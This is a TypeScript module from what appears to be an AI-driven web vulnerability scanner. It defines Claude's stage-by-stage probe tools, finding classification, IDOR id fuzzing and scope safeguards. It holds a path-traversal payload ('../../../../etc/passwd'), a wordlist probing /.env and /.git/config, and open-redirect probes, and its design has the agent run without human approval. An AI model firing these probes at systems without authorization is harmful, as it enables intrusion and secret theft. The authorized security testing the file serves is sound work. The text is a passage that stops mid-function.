// The toolbox Claude drives (in-process MCP). Existing deterministic primitives are demoted to Claude tools.
// Scope / marker / rate are enforced inside the tools (= the safety valves remain, but we don't stop for human approval).
//
// All tools used across the 3 stages (survey / methodology / diagnose) are defined here; run.ts uses allowedTools
// to narrow which tools are visible per stage (= don't show Claude everything at once → prevent it from eliding work).

import type { AssessmentStore, Finding, FindingVerdict, Param, Screen, ScopePolicy, Severity } from "@veritas/core";
import { findingVerdict, isInScope } from "@veritas/core";
import type { LoginCreds, Observation, PlaywrightDriver } from "@veritas/crawler";
import { InventoryBuilder, normalizePath, smartLogin, guessParamType, extractApiRefs, apiCallToBuiltScreen } from "@veritas/crawler";
import type { LlmClient } from "@veritas/llm";
import type { EvidenceStore, FetchHttpClient, HttpRequest, HttpResponse, OobProvider, TechComponent, TechSample } from "@veritas/scanner";
import { fingerprintTech, formatTechInventory, lookupCves, formatCveResults, impactOracle, identityAppears, classifyCrossUserBody, auditHeaders, isPublicByDesignClientCredential, isVersionlessComponentLead } from "@veritas/scanner";
import { placePayload, parseLocation, oobFilesToMultipart, filesHaveOobPlaceholder } from "./inject.js";
import { analyzeJsSinksFull } from "./jssinks.js";
import { bumpJwtExp, jwtForgeCandidates, parseJwt, pemFromJwks } from "./jwt.js";
import { placeUserIdentity, userEnumMarker } from "./user-enum.js";
import { disclosureHit, looksLikePublicWebFile } from "./disclosure.js";
import { formatRequestDump, glanceCookie, parseCookieHeader, peekJwt } from "./session-glance.js";
import { bearerFromOrigins, normalizeOrigins, type StorageOrigin } from "./storage-state.js";
import { SSRF_CONTROL, SSRF_PAYLOADS, placeSsrfTarget, ssrfHit } from "./ssrf.js";
import { NOSQL_OP_OBJECTS, NOSQL_OP_QUERY, NOSQL_CONTROL_VALUE, nosqlTimeObject, nosqlErrorSignature, nosqlBypassConfirms, nosqlQueryUrl } from "./nosql.js";
import { detectUrlWrapper } from "./encoding.js";
import { XXE_ENTITY_URLS, controlSvg, extractFetchUrls, xssSvg, xxeSvg } from "./upload.js";
import { tool } from "@anthropic-ai/claude-agent-sdk";
import { z } from "zod";
import { join } from "node:path";
import { readFileSync, renameSync } from "node:fs";

export { forgeAlgNone } from "./jwt.js";

/** In attended (manual multi-session) mode, 1 role = 1 persistent context. Holds a live session. */
export interface RoleSession {
  driver: PlaywrightDriver;
  /** Most recently synced Cookie header (for the http path). Re-synced by keepalive. */
  cookie: string;
}

export interface PilotSession {
  /** The driver for the currently active role. In attended mode, login() swaps between roles. */
  driver: PlaywrightDriver;
  http: FetchHttpClient;
  evidence: EvidenceStore;
  store: AssessmentStore;
  assessmentId: string;
  /** runs/<id>/artifacts. Screen screenshots are saved to screens/<screenId>.png. */
  artifactsDir: string;
  scope: ScopePolicy;
  targetUrl: string;
  /** Goto-safe authenticated hub (the menu). When set (--anchor-url), a route that bounces to an error page on a cold
   *  navigation is reached by clicking its link from here instead, and it's the preferred keepalive touch target. */
  anchorUrl?: string;
  roleCreds: Map<string, LoginCreds>;
  /** Role name → path to a pre-captured Cookie file (instead of credentials; for walls that can't be auto-logged-in). */
  roleCookieFiles: Map<string, string>;
  /** Role name → that role's own login entry URL (user vs admin log in at different pages). The login() tool starts
   *  smartLogin there. Optional; falls back to targetUrl. */
  roleLoginUrls?: Map<string, string>;
  /** Role name → free-form privilege description (e.g. "full admin" / "regular user (read-only)"). Used for the high/low-privilege call in auth-diff. */
  roleDescriptions: Map<string, string>;
  loginLlm: LlmClient;
  /** A fresh DOM-XSS proof screenshot captured by probe_dom_xss at the moment the payload EXECUTED (a visible banner
   *  is injected on fire, so the shot actually shows the XSS). record_finding consumes it for the next xss finding
   *  (moving it to findings/<fid>.png) instead of a generic current-page capture. rel = path under artifactsDir. */
  xssProof?: { rel: string; at: number };
  currentCookie: string;
  /** Bearer JWT held by the SPA (localStorage etc.). So it reaches APIs that don't use cookie auth (Juice Shop etc.),
   *  http_request / probe_logic send it as `Authorization: Bearer`. login() updates it per role. */
  currentBearer: string;
  currentRole: string;
  findings: Finding[];
  findCounter: number;
  /** dedup key (class×endpoint×param) → existing finding. Coalesces over-reporting across endpoints. */
  findingsByKey: Map<string, Finding>;
  /** verify_access machine verdict (normalized endpoint → verdict). record_finding hard-gates auth-bypass on it. */
  accessVerdicts: Map<string, AccessVerdict>;
  /** record_finding call count (new + merged). Used for the screen verdict. */
  recordCalls: number;
  // ── http stats for the auth-wall circuit breaker (diagnosis probe responses) ──
  /** Total number of diagnosis probes. */
  httpProbes: number;
  /** Of those, how many were rejected with 401 (auth wall). */
  httpAuthWall: number;
  /** Of those, how many got through (2xx, past auth). */
  httpThrough: number;
  /** Number of diagnosis probes fired on the current screen (reset when a screen starts). Used to cross-check the screen_done coverage gate
   *  (rejects "everything is clean" self-reports that actually never probed once). */
  screenProbes: number;
  done: boolean;
  doneSummary: string;
  /** Even within done, "interrupted by token/usage-limit exhaustion" = not a skip but a resumable pause.
   *  When set, finalization doesn't drop the phase to report, and screens still being diagnosed are returned to queued (re-diagnosable). */
  paused: boolean;
  model: string | undefined;
  // ── stage operation state ──
  /** Observation → Screen + dedup (the same ledger as assess). */
  inv: InventoryBuilder;
  /** Visited URLs (hash stripped). */
  visited: Set<string>;
  /** In-scope, unvisited links (survey's remaining tasks = the frontier that prevents eliding work). */
  frontier: Set<string>;
  /** Routes that bounce to an error/login catch-all on a cold navigation (referer/click-gated). Kept OUT of the frontier
   *  so the crawl doesn't loop re-navigating them onto the error page; reached instead by an in-app browser_click. */
  refererGated: Set<string>;
  /** Low-value path patterns the model dynamically pruned via ignore_paths (CMS content trees etc.). Filtered out when adding to the frontier. */
  ignorePaths: string[];
  /** Exhaustive extraction mode (--exhaustive). When true, ignore_paths is disabled (map every screen). */
  exhaustive: boolean;
  /** Upper bound on the number of screens survey maps (--max-survey-screens). On reaching it, stop exploration (empty the frontier). Unset = unlimited. */
  maxSurveyScreens?: number;
  /** Cap-reached flag (set by recordObservation; survey_status uses it to signal "explore no further"). */
  surveyCapped?: boolean;
  /** Hard lock on the URL list. When true, recordObservation does not add discovered links to the frontier
   *  (don't crawl across the site, map only the seed URLs). */
  lockToSeeds: boolean;
  /** On every browser_navigate, automatically run an input sweep (submit forms/searches with benign values to discover new routes/APIs). */
  inputSweep: boolean;
  /** In the input sweep, also submit POST forms (= write data to the target). If false, GET/search only. */
  aggressiveForms: boolean;
  /** Whether to query an online CVE DB (OSV/NVD) for detected versions in A06 (opt-in: egress to a third party). If off, cve_lookup is disabled. */
  cveLookup: boolean;
  /** screenId → methodology (attack plan). */
  plans: Map<string, string>;
  /** screenId being diagnosed (the anchor for record_finding / http_request evidence). */
  currentScreenId: string | null;
  /** Diagnosis result for the most recent screen (set by screen_done). */
  screenVerdict: "finding" | "suspected" | "clean" | null;
  /** Set by skip_screen: the current screen was flagged out-of-scope for ACTIVE testing (high-harm / out-of-ROE) and
   *  excluded, NOT diagnosed — the run continues to the next screen instead of halting. Reset per screen. */
  screenSkipReason: string | null;
  // ── stage completion signals ──
  surveyDone: boolean;
  /** Completion signal for the post-survey recon extrapolation (LLM URL-guessing) pass. */
  reconGuessDone: boolean;
  methodologyDone: boolean;
  screenDone: boolean;
  /** Completion signal for the scenario (A04 cross-cutting logic) stage. */
  scenarioDone: boolean;
  /** Completion signal for the fingerprint (A06 known-vulnerable component) stage. */
  fingerprintDone: boolean;
  /** Connection to OOB infrastructure (Interactsh or Burp Collaborator). If set, probe_oob is usable.
   *  For out-of-band confirmation of blind SSRF/XXE/SQLi etc. If unset, probe_oob returns not-available. */
  oob?: OobProvider;
  // ── attended (manual multi-session auth) ──
  /** Per-role live sessions that were manually logged in. Unset = normal (single-context) mode. */
  roleSessions?: Map<string, RoleSession>;
}

/** Tools shown per stage (base names). run.ts prefixes them with `mcp__veritas__` and passes them to allowedTools. */
export const STAGE_TOOLS = {
  survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "analyze_js", "ignore_paths", "survey_status", "survey_done"],
  // recon extrapolation: after survey, read the mapped surface and forced-browse LLM-predicted unlinked endpoints.
  reconGuess: ["get_inventory", "probe_guesses", "browser_navigate", "guess_done"],
  methodology: ["get_inventory", "record_methodology", "methodology_done"],
  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_nosql", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_cors", "probe_proto", "probe_jwt", "probe_csrf", "probe_oob", "probe_ssrf", "probe_upload", "probe_logic", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "probe_headers", "analyze_session", "verify_access", "probe_idor", "analyze_js", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done", "skip_screen"],
  // scenario (A04 cross-cutting logic): overview the inventory + fire multi-step request chains via probe_scenario. Once, after per-screen diagnosis.
  scenario: ["get_inventory", "login", "http_request", "browser_navigate", "browser_fill", "browser_click", "probe_scenario", "probe_race", "probe_reset_poison", "probe_user_enum", "probe_secrets", "record_finding", "scenario_done"],
  // fingerprint (A06 known-vulnerable components): fingerprint_scan to collect versions, evaluate known CVEs (cve_lookup opt-in) and record.
  fingerprint: ["fingerprint_scan", "cve_lookup", "http_request", "record_finding", "fingerprint_done"],
} as const;

const txt = (s: string): { content: { type: "text"; text: string }[] } => ({ content: [{ type: "text", text: s }] });

function pick(h: Record<string, string>, keys: string[]): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of keys) if (h[k] !== undefined) o[k] = h[k];
  return o;
}

/** Canonical key for frontier/visited. Keep SPA routes (#/foo, #!/foo) as distinct screen identifiers, and
 *  drop in-page anchors (#, #section, empty #/). This lets hash-routed SPAs (Angular etc.) be mapped
 *  systematically. Screen-level duplicates are handled separately by domSkeletonHash, so this doesn't over-proliferate. */
export function stripHash(u: string): string {
  const i = u.indexOf("#");
  if (i < 0) return u;
  return /^#!?\/.+/.test(u.slice(i)) ? u : u.slice(0, i);
}

const SEV_ORDER: Severity[] = ["info", "low", "medium", "high", "critical"];
function maxSev(a: Severity, b: Severity): Severity {
  return SEV_ORDER.indexOf(a) >= SEV_ORDER.indexOf(b) ? a : b;
}

/** Per-category severity band [min,max]. record_finding clamps the model's choice into this band for consistency
 *  (fixes the same class sometimes coming out High, sometimes Medium). Context-driven up/down is allowed only within the band. */
const SEVERITY_BAND: Partial<Record<string, { min: Severity; max: Severity }>> = {
  rce: { min: "critical", max: "critical" }, // RCE/CMDi is always Critical (operator policy)
  ssti: { min: "high", max: "critical" }, // SSTI = RCE-equivalent (High only if pure template eval)
  sqli: { min: "high", max: "critical" }, // Critical if auth bypass / full DB exposure
  "auth-bypass": { min: "high", max: "critical" },
  idor: { min: "medium", max: "high" },
  "idor-write": { min: "high", max: "critical" }, // tampering with another user's data
  "path-traversal": { min: "medium", max: "critical" }, // arbitrary file read = High, RCE-capable = Critical
  ssrf: { min: "medium", max: "high" },
  xxe: { min: "high", max: "critical" }, // arbitrary file read / SSRF chain
  "xss-stored": { min: "medium", max: "high" }, // persistent, affects other users
  "xss-reflected": { min: "low", max: "medium" }, // reflected XSS is Medium as a rule
  "open-redirect": { min: "low", max: "medium" },
  csrf: { min: "low", max: "medium" },
  "price-tampering": { min: "high", max: "critical" },
  "qty-tampering": { min: "high", max: "critical" },
  "workflow-bypass": { min: "medium", max: "high" },
  "mass-assignment": { min: "high", max: "critical" }, // privilege escalation
  "race-condition": { min: "medium", max: "high" },
  "secret-exposure": { min: "medium", max: "critical" }, // up/down depending on what leaked
  "vulnerable-component": { min: "low", max: "critical" }, // broad, CVE-dependent (suspected is separately restricted to High+)
  "info-disclosure": { min: "info", max: "medium" },
  session: { min: "low", max: "high" },
  "rate-limit": { min: "info", max: "medium" },
  headers: { min: "info", max: "low" },
  misconfig: { min: "low", max: "high" },
  "cors-misconfig": { min: "low", max: "high" },
  "prototype-pollution": { min: "high", max: "critical" },
};

/** Fit the model's chosen severity into the category's band (clamp to min/max if outside). Bands left undefined pass through. */
export function normalizeSeverity(category: string, chosen: Severity): Severity {
  const band = SEVERITY_BAND[category];
  if (!band) return chosen;
  const r = (s: Severity): number => SEV_ORDER.indexOf(s);
  if (r(chosen) < r(band.min)) return band.min;
  if (r(chosen) > r(band.max)) return band.max;
  return chosen;
}

/** vulnClass free text → coarse category (for the dedup key). Folds paraphrases of the same hole into one.
 *  If passed a canonical category (CATEGORIES), returns it as-is (idempotent; prevents mis-folding xss-stored). */
export function coarseClass(vulnClass: string): string {
  const s = vulnClass.toLowerCase().trim();
  if ((CATEGORIES as readonly string[]).includes(s)) return s; // canonical categories pass through (idempotent)
  // Normalize hyphens/underscores to spaces (robust to methodology paraphrases like "SQL-injection"/"stored-XSS").
  const sn = s.replace(/[_-]+/g, " ");
  if (/stored xss|persistent xss/.test(sn)) return "xss-stored";
  if (/xss|cross\s?site script/.test(sn)) return "xss-reflected";
  if (/path travers|arbitrary file|file read|\blfi\b|directory travers|cwe 22/.test(sn)) return "path-traversal";
  if (/\bsqli\b|sql inj/.test(sn)) return "sqli";
  if (/idor|bola|object\s?level|broken access|broken object/.test(sn))
    return /write|overwrite|update|modif|edit/.test(sn) ? "idor-write" : "idor";
  if (/open redirect|unvalidated redirect/.test(sn)) return "open-redirect";
  if (/\bxxe\b|xml external|external entit/.test(sn)) return "xxe";
  if (/\bssrf\b/.test(sn)) return "ssrf";
  if (/template inj|\bssti\b/.test(sn)) return "ssti";
  if (/\brce\b|command inj|remote code|\bcmdi\b/.test(sn)) return "rce";
  if (/secret|credential|hardcoded|api[\s-]?key|private key|leaked key|access key/.test(sn)) return "secret-exposure";
  if (/rate limit|lockout|brute\s?force/.test(sn)) return "rate-limit";
  if (/security header|missing header|response header/.test(sn)) return "headers";
  if (/\bcsrf\b|cross\s?site request/.test(sn)) return "csrf";
  return s.replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "").slice(0, 24) || "other";
}

/** Normalize an endpoint by the same rules as inventory (treat /orders/o10 and /orders/{id} as the same).
 *  Both a concrete URL (/orders/o10) and a template (/orders/{id}) collapse to the same key. */
export function normEndpoint(ep: string, base: string): string {
  let path: string;
  try {
    path = decodeURIComponent(new URL(ep, base).pathname);
  } catch {
    path = ep.split("?")[0] ?? ep;
  }
  try {
    return normalizePath(path).template;
  } catch {
    return path.toLowerCase();
  }
}

/** finding dedup key = (coarse category × normalized endpoint × param). Coalesces duplicate reports of the same hole into one. */
export function dedupKey(vulnClass: string, endpoint: string, param: string | undefined, base: string): string {
  return `${coarseClass(vulnClass)}::${normEndpoint(endpoint, base)}::${param ?? ""}`;
}

/** Canonical classes for record_finding (classification consistency + stable dedup key). */
export const CATEGORIES = [
  "idor",
  "idor-write",
  "xss-reflected",
  "xss-stored",
  "sqli",
  "ssti",
  "path-traversal",
  "open-redirect",
  "ssrf",
  "xxe",
  "rce",
  "auth-bypass",
  "account-takeover", // password-reset / account-recovery abuse: reset poisoning, token predictability/leakage/reuse, broken reset logic, magic-link/2FA bypass
  "user-enumeration", // valid vs invalid username → different response body/status/timing
  "session",
  "csrf",
  "info-disclosure",
  "secret-exposure", // exposed credentials/secrets (confirmed by the impact oracle's secret/file-leak)
  "misconfig",
  "rate-limit",
  "headers",
  "vulnerable-component", // A06: outdated component with a known vulnerability (server/middleware/frontend lib)
  // A04 business logic (confirmed by the differential-test verifier = probe_logic)
  "price-tampering",
  "qty-tampering",
  "workflow-bypass",
  "mass-assignment",
  "race-condition",
  "cors-misconfig",
  "prototype-pollution",
  "other",
] as const;

/** Business-logic categories (use probe_logic's differential test + record_finding's marker-based confirmation). */
export const BUSINESS_LOGIC_CATEGORIES = new Set<string>(["price-tampering", "qty-tampering", "workflow-bypass", "mass-assignment"]);

/** Categories of the "confirmed when a specific marker appears in the response" type (judged by marker presence, not length delta).
 *  Business logic (probe_logic/probe_scenario) + reflected XSS (unescaped reflection) + open-redirect (Location is the OOB). */
// path-traversal is marker-based: probe_traversal ALWAYS confirms by reading real file content (/etc/passwd root:x:0:0,
// win.ini, base64 source) — a traversal that returns no file content is not a traversal. Confirming it on a bare body-
// length delta (the previous behaviour) both discarded the strong proof the probe already computed and let benign
// dynamic-length differences read as "confirmed". idor/sqli intentionally stay length/status-based (see probe-confirm.test).
export const MARKER_BASED_CATEGORIES = new Set<string>([...BUSINESS_LOGIC_CATEGORIES, "xss-reflected", "xss-stored", "open-redirect", "ssti", "secret-exposure", "user-enumeration", "race-condition", "account-takeover", "info-disclosure", "ssrf", "xxe", "path-traversal", "cors-misconfig", "prototype-pollution"]);

/** Injection/execution classes whose in-band SUSPECTED lead requires a MARKER (or a status flip) — a bare body-length
 *  delta between two different pages is NOT a lead for these. Their real in-band signal is fetched internal content / a
 *  computed product / a SQL error / a file's contents (an effectMarker), never length alone. Without this a fabricated
 *  "SSRF to GCP metadata" got recorded off two unrelated SharePoint pages that merely differed by >64 bytes. */
export const MARKER_REQUIRED_SUSPECT_CATEGORIES = new Set<string>(["ssrf", "sqli", "rce", "ssti", "xxe", "path-traversal"]);

/** Categories that don't allow verdict:"suspected". Two reasons: (1) low-value hygiene classes that just add noise
 *  (rate-limit/headers/info-disclosure/misconfig — were being mass-produced as "suspected"); (2) XSS, where even the general
 *  substance gate (an observation that DIFFERS from a control) can't discriminate: an injected marker reflects whether it is
 *  ESCAPED (not XSS) or LIVE (confirmable via reflectionIsLive → record confirmed), so there is no honest "suspected" state
 *  between them — a field-name guess or a "sibling was confirmed" claim is a hypothesis. Drive probe_stored_xss/probe_dom_xss
 *  to the render sink and confirm, else mark the class tested-clean / not-applicable. All of these are confirmed-or-skip only. */
export const SUSPECT_EXCLUDED_CATEGORIES = new Set<string>(["rate-limit", "headers", "info-disclosure", "misconfig", "xss-reflected", "xss-stored"]);

/** probe_paths' "simple directory list" = a curated wordlist for hitting unlinked endpoints.
 *  ※ Do **not** include logout/signout paths. GETting them under an authenticated session destroys the server-side session,
 *    wiping out all subsequent auth diagnosis (self-sabotage). isSessionDestroyingPath filters them out a second time too. */
const PATH_WORDLIST = [
  "/admin", "/administrator", "/api", "/api/profile", "/api/users", "/api/user", "/api/orders", "/api/admin", "/api/config",
  "/account", "/account/edit", "/profile", "/settings", "/users", "/user", "/dashboard",
  "/status", "/health", "/healthz", "/metrics", "/debug", "/server-status", "/actuator", "/info", "/version",
  "/config", "/.env", "/.git/config", "/backup", "/robots.txt", "/sitemap.xml",
  "/login", "/register", "/signup", "/upload", "/uploads", "/files", "/download",
  "/search", "/orders", "/cart", "/checkout", "/support", "/continue", "/redirect", "/go",
  "/swagger", "/api-docs", "/graphql", "/.well-known/security.txt",
];

/** Paths with a session-destroying side effect (logout/signout/SSO logout etc.). Auto-traversing them in an authenticated
 *  assessment wipes the server-side session and kills all subsequent auth diagnosis, so probe_paths must never hit them. */
const SESSION_DESTROYING = /(^|\/)(logout|log-out|logoff|log-off|signout|sign-out|sign_out|disconnect|(sso|saml|oidc|oauth2?|account|auth|session|user)\/(logout|signout|sign-out))(\/|$|\?|#)/i;
export function isSessionDestroyingPath(pathOrUrl: string): boolean {
  let p = pathOrUrl;
  try {
    p = new URL(pathOrUrl, "http://x/").pathname;
  } catch {
    /* relative/malformed: judge as-is */
  }
  return SESSION_DESTROYING.test(p);
}

/** IDOR fuzzing: candidate neighbour ids around a self-owned id, for when the model has NO known victim id (cross-tenant /
 *  needs-another-user's-object). Walks a pure-numeric id (n±1, ±2, ±3) or a fixed-prefix + trailing-digits id
 *  (user-1024, ORD00042 — width-preserving), plus a few low/seed ids (1, 2, 1000) that often belong to admin/seed rows.
 *  Returns [] for an OPAQUE id (uuid / long hex) that can't be walked → the caller falls back to verdict:suspected. */
export function idNeighbors(selfId: string): string[] {
  // Opaque ids (uuid / long hex) carry trailing digits but are NOT enumerable — guard before the prefix+digits branch.
  if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-/i.test(selfId) || /^[0-9a-f]{16,}$/i.test(selfId)) return [];
  const out: string[] = [];
  const push = (v: string): void => {
    if (v !== selfId && !out.includes(v)) out.push(v);
  };
  if (/^\d+$/.test(selfId)) {
    const n = Number(selfId);
    if (!Number.isSafeInteger(n)) return [];
    for (const d of [1, -1, 2, -2, 3]) if (n + d >= 0) push(String(n + d));
    for (const c of [1, 2, 1000]) push(String(c)); // low / round ids often = seed or admin accounts
    return out.slice(0, 6);
  }
  const m = selfId.match(/^([A-Za-z][A-Za-z_.-]{0,15})(\d{1,10})$/); // short alpha(-ish) prefix + trailing digits
  if (m) {
    const [, prefix, digits] = m;
    const width = digits!.length;
    const n = Number(digits);
    if (!Number.isSafeInteger(n)) return [];
    for (const d of [1, -1, 2, -2]) if (n + d >= 0) push(`${prefix}${String(n + d).padStart(width, "0")}`);
    for (const c of [1, 2]) push(`${prefix}${String(c).padStart(width, "0")}`);
    return out.slice(0, 6);
  }
  return out; // non-enumerable id shape
}

/** A non-existent id of the SAME shape as `id` — the IDOR negative control (must be deniable so a catch-all 200 shows up). */
export function nonexistentIdLike(id: string): string {
  if (/^\d+$/.test(id)) return "2147483646";
  const m = id.match(/^([A-Za-z][A-Za-z_.-]{0,15})(\d{1,10})$/);
  if (m) return `${m[1]}${"9".repeat(m[2]!.length)}`; // same prefix, all-nines tail = almost certainly absent
  return "00000000-0000-0000-0000-000000000000";
}

/** WHERE an id lives on a request — so probe_idor's sweep can place a fuzzed id in each id-bearing field's OWN location
 *  (query/body/header/path), not just the single one the model named. */
export type IdParamLoc =
  | { via: "header"; name: string }
  | { via: "query"; name: string }
  | { via: "body-field"; name: string }
  | { via: "path"; example: string };

/** Set/replace a field in a form-urlencoded body (append if absent). Used to place a fuzzed id into a body-param location. */
export function setFormField(body: string | null | undefined, name: string, val: string): string {
  const enc = `${encodeURIComponent(name)}=${encodeURIComponent(val)}`;
  if (!body) return enc;
  const key = `${encodeURIComponent(name)}=`;
  let found = false;
  const out = body.split("&").map((p) => (p.startsWith(key) ? ((found = true), enc) : p));
  if (!found) out.push(enc);
  return out.join("&");
}

/** Replace the LAST path segment equal to `seg` with `val` (path-param IDOR: /event/785687 → /event/785688). null if absent. */
export function replacePathSeg(u: string, seg: string, val: string): string | null {
  try {
    const uu = new URL(u);
    const parts = uu.pathname.split("/");
    const i = parts.lastIndexOf(seg);
    if (i < 0) return null;
    parts[i] = encodeURIComponent(val);
    uu.pathname = parts.join("/");
    return uu.toString();
  } catch {
    return null;
  }
}

/** Deterministically pick a screen's id-bearing params (guessedType id/object_ref, or the rule re-derives one from
 *  name+example — same predicate as knownObjectIds) and map each to WHERE its id lives. This is what lets probe_idor
 *  SWEEP every id field on the screen instead of testing only the single param the model happened to name. */
export function idBearingParamLocs(params: ReadonlyArray<Param>): Array<{ name: string; example: string; loc: IdParamLoc }> {
  const out: Array<{ name: string; example: string; loc: IdParamLoc }> = [];
  const seen = new Set<string>();
  for (const p of params) {
    if (!p.example) continue;
    const isId = p.guessedType === "object_ref" || p.guessedType === "id" || guessParamType(p.name, p.in, p.example) === "object_ref";
    if (!isId) continue;
    const loc: IdParamLoc | null =
      p.in === "header" ? { via: "header", name: p.name } : p.in === "query" ? { via: "query", name: p.name } : p.in === "body" ? { via: "body-field", name: p.name } : p.in === "path" ? { via: "path", example: p.example } : null;
    if (!loc) continue;
    const k = `${p.in}:${p.name}`;
    if (seen.has(k)) continue; // one entry per (location,name) — a param repeated across apis shouldn't multiply the sweep
    seen.add(k);
    out.push({ name: p.name, example: p.example, loc });
  }
  return out;
}

/** Substance check for a SUSPECTED lead (the ①-core of the suspected gate): did the cited observation actually SHOW an
 *  anomaly, or is it just the endpoint's shape? True iff the observation measurably DIFFERS from a cited control — a
 *  status flip, a >64-byte length delta, or an effectMarker that appears ONLY in the observation. A structural lead (a
 *  client-controlled id, a field name, "no positive evidence obtained") produces no such differential, so it fails. */
export function observationDiffersFromControl(ctrl: { status: number; body: string } | undefined, obs: { status: number; body: string }, marker?: string): boolean {
  if (!ctrl) return false;
  return ctrl.status !== obs.status || Math.abs(ctrl.body.length - obs.body.length) > 64 || (!!marker && obs.body.includes(marker) && !ctrl.body.includes(marker));
}

/** A safe marker that never attempts external reachability (for open-redirect / reflection detection; a non-resolving domain). */
const OOB_MARKER = "veritas-oob.example";

/** Does the Location header actually REDIRECT to `host` (its parsed target host), rather than merely mention it as a
 *  substring? A same-site interstitial like `Location: /leaving?url=https://host/` reflects the payload but redirects
 *  ON-SITE — `loc.includes(host)` false-confirms it as an open redirect; the parsed hostname does not. */
export function locationTargetsHost(location: string | undefined, base: string, host: string): boolean {
  if (!location) return false;
  try {
    return new URL(location, base).hostname.toLowerCase() === host.toLowerCase();
  } catch {
    return false;
  }
}

/** High-signal hidden-parameter set for probe_params (ones the app doesn't normally send). */
const PARAM_PROBES: Array<{ name: string; value: string; kind: "idor" | "redirect" | "debug" | "file" }> = [
  ...["id", "userId", "user_id", "user", "account", "accountId", "uid", "customerId", "orderId", "order"].map(
    (name) => ({ name, value: "1", kind: "idor" as const }),
  ),
  ...["to", "next", "url", "redirect", "returnUrl", "return", "continue", "dest", "callback"].map(
    (name) => ({ name, value: `https://${OOB_MARKER}/`, kind: "redirect" as const }),
  ),
  ...["debug", "test", "admin", "isAdmin", "verbose", "trace"].map((name) => ({ name, value: "1", kind: "debug" as const })),
  ...["file", "path", "filename", "template", "page", "include"].map(
    (name) => ({ name, value: "../../../../etc/passwd", kind: "file" as const }),
  ),
];

/** {{var}} substitution for probe_scenario. Replaces {{name}} in the string with vars[name] (undefined → empty string). */
export function substVars(input: string, vars: Record<string, string>): string {
  return input.replace(/\{\{\s*([A-Za-z0-9_.]+)\s*\}\}/g, (_, k: string) => vars[k] ?? "");
}

/** Extract a value from a response body (probe_scenario's capture). First a JSON path (dot/array index, e.g. data.0.id),
 *  else the regex's first capture group. Returns null if nothing found. The basis for feeding an earlier id/token into a later step. */
export function extractValue(body: string, expr: string): string | null {
  // ① JSON path
  try {
    const json = JSON.parse(body);
    let cur: unknown = json;
    for (const seg of expr.split(".")) {
      if (cur == null) break;
      const idx = /^\d+$/.test(seg) ? Number(seg) : seg;
      cur = (cur as Record<string | number, unknown>)[idx];
    }
    if (cur != null && (typeof cur === "string" || typeof cur === "number" || typeof cur === "boolean")) return String(cur);
  } catch {
    /* not json — fall through to regex */
  }
  // ② regex (first capture group, or the whole match if none)
  try {
    const m = new RegExp(expr).exec(body);
    if (m) return m[1] ?? m[0];
  } catch {
    /* invalid regex */
  }
  return null;
}

/** Turn the current role's auth material (cookie + Bearer JWT) into headers. Includes the bearer so it also reaches
 *  APIs that don't use cookie auth (Juice Shop's `Authorization: Bearer <localStorage.token>` etc.). Caller headers can override. */
export function authHeaders(s: Pick<PilotSession, "currentCookie" | "currentBearer">): Record<string, string> {
  return {
    ...(s.currentCookie ? { cookie: s.currentCookie } : {}),
    ...(s.currentBearer ? { authorization: `Bearer ${s.currentBearer}` } : {}),
  };
}

/** ignore_paths pattern matching. Treats `*` as a wildcard; patterns without a `*` are prefix matches.
 *  e.g. "/news/" matches everything under /news/, "/artikel/*" likewise, "/p" matches every path starting with /p. URL or relative, judged on the path. */
export function pathIsIgnored(urlOrPath: string, patterns: ReadonlyArray<string>, base: string): boolean {
  if (patterns.length === 0) return false;
  let path: string;
  try {
    path = new URL(urlOrPath, base).pathname;
  } catch {
    path = urlOrPath.split("?")[0] ?? urlOrPath;
  }
  path = path.toLowerCase();
  return patterns.some((raw) => {
    const p = raw.toLowerCase().trim();
    if (!p) return false;
    if (p.includes("*")) {
      const rx = new RegExp(`^${p.split("*").map((s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join(".*")}`);
      return rx.test(path);
    }
    return path.startsWith(p);
  });
}

/** The roles usable by login() (name + optional privilege description). In attended mode, the live-session keys (including pure-manual roles);
 *  normally, the credentials + Cookie-file keys. description is the material auth-diff uses to tell high/low privilege apart. */
export function availableRoles(s: PilotSession): Array<{ name: string; description?: string }> {
  const names = s.roleSessions ? [...s.roleSessions.keys()] : [...new Set([...s.roleCreds.keys(), ...s.roleCookieFiles.keys()])];
  return names.map((name) => {
    const description = s.roleDescriptions.get(name);
    return description ? { name, description } : { name };
  });
}

export interface LoadedAuth {
  header: string;
  browserCookies: Array<{ name: string; value: string; domain: string; path: string }>;
  origins: StorageOrigin[];
  /** Bearer JWT recovered from origin localStorage (SPA token-auth). Empty if none. */
  bearer: string;
}

/** Read an operator-supplied Cookie file. Auto-detects a raw Cookie header ("a=1; b=2") / a Playwright storageState JSON
 *  ({cookies:[...], origins:[...]}) / a simple array ([{name,value}]) → an http header + cookies for browser injection
 *  + origin localStorage (Bearer-in-localStorage SPAs). */
export function loadCookieFile(path: string, targetUrl: string): LoadedAuth {
  const raw = readFileSync(path, "utf8").trim();
  let host = "";
  try {
    host = new URL(targetUrl).hostname;
  } catch {
    host = "";
  }
  try {
    const j = JSON.parse(raw) as unknown;
    const isArr = Array.isArray(j);
    const isState = !isArr && !!j && typeof j === "object" && ("cookies" in (j as object) || "origins" in (j as object));
    if (isArr || isState) {
      const arr = isArr ? j : ((j as { cookies?: unknown[] }).cookies ?? []);
      const bc = (arr as Array<{ name?: string; value?: unknown; domain?: string; path?: string }>)
        .filter((c) => c && c.name)
        .map((c) => ({ name: c.name as string, value: String(c.value ?? ""), domain: c.domain || host, path: c.path || "/" }));
      const origins = isArr ? [] : normalizeOrigins((j as { origins?: unknown }).origins);
      const bearer = bearerFromOrigins(origins);
      if (bc.length > 0 || origins.length > 0) {
        return { header: bc.map((c) => `${c.name}=${c.value}`).join("; "), browserCookies: bc, origins, bearer };
      }
    }
  } catch {
    /* not JSON → treat as a raw header */
  }
  const header = raw.replace(/^cookie:\s*/i, "").split(/\r?\n/)[0]?.trim() ?? "";
  const browserCookies = header
    .split(";")
